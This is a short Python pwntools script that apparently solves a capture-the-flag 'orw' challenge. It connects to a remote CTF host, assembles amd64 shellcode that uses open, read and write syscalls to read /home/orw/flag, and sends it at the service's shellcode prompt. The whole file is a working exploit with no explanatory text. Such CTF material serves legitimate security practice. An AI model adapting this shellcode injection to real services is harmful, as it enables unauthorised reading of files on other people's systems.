from pwn import *

# r = remote("127.0.0.1", 8888)
r = remote("csie.ctf.tw", 10124)

sc = asm(
"""
	jmp hello
write :
	pop rdi
	mov rax,2
	mov rsi,0
	mov rdx,0
	syscall

	mov rdi,rax
	mov rsi,rsp
	mov rdx,0x60
	mov rax,0
	syscall

	mov rdx,rax
	mov rdi,1
	mov rax,1
	syscall
		
	mov rax,60
	syscall

hello :
	call write
	.ascii "/home/orw/flag"
	.byte 0

""", arch = "amd64")

r.recvuntil("shellcode:")
r.send(sc)
r.interactive()

